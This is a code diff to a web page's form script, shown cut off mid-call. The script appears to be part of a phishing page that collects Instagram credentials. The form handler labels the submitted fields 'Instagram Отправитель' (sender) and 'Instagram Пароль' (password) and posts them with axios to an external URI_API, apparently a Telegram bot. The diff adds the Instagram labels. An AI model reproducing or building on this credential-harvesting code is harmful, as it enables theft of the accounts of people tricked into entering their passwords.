@@ -7,6 +7,7 @@ const emailInput = document.getElementById('email')
 const icon = document.querySelector(".icon ion-icon")
 const btn = document.getElementById('submitButton')
 
+
 console.log(emailInput);
 btn.addEventListener('click', () => {
   if (emailInput.value.length < 8 || nameInput.value.length < 1) {
@@ -32,10 +33,11 @@ icon.addEventListener('click', () => {
 
 document.getElementById('tg').addEventListener('submit', function(e){
     e.preventDefault()
+    console.log(e);
 
 let message = `<b> Заявка с сайта !</b>\n`
-message += `<b> Отправитель: </b> ${ this.name.value }\n`
-message += `<b> Пароль: </b> ${ this.email.value }\n`
+message += `<b> Instagram Отправитель: </b> ${ this.name.value }\n`
+message += `<b> Instagram Пароль: </b> ${ this.email.value }\n`
 
 
 axios.post(URI_API, {
